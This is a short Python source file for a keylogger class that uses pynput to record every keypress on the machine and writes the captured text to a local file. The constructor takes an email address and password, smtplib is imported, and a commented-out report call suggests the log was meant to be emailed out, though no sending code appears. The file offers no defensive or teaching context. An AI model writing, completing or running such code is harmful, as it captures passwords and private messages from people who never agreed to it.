import pynput.keyboard
import threading
import smtplib

# Global variables
log = ""


class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = ""
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log = self.log + string
        with open('test.txt', 'w') as f:
            f.write(self.log)

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(
            on_press=self.process_key_press)
        with keyboard_listener:
            # self.report()
            keyboard_listener.join()
